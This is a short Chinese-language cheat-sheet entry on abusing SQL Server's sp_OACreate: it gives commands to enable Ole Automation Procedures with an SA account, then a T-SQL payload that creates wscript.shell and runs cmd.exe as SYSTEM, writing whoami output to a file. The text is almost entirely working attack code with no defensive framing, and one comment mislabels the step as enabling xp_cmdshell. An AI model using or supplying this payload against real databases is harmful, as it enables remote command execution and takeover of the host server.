sqlserver默认有个组件sys.sp_OACreate组件
一般默认开启了
如果未开启，有SA账号手动开启。

## **启用**
SA账号执行手动开启
```
允许修改高级参数
    EXEC sp_configure 'show abvanced options',1;
    RECONFIGURE WITH OVERRIDE;
打开xp_cmdshell扩展
    exec sp_configure 'Ole Automation Procedures',1;
    reconfigure WITH OVERRIDE;
```


## **最高权限命令执行**

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod 
@shell,'run',null,'c:\windows\system32\cmd.exe /c whoami>c:\\1.txt'
```
执行命令，命令写入c:\\1.txt文件里，可以打开看到为system权限。